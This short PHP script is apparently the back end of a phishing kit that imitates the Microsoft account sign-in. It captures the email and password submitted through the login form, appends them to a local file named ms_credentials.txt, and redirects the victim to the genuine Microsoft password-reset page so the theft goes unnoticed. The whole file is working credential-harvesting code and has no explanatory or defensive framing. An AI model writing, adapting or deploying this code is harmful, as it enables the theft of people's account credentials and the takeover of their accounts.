<?php

file_put_contents("ms_credentials.txt", "Microsoft Account: " . $_POST['loginfmt'] . " Password: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://account.live.com/ResetPassword.aspx');
exit();
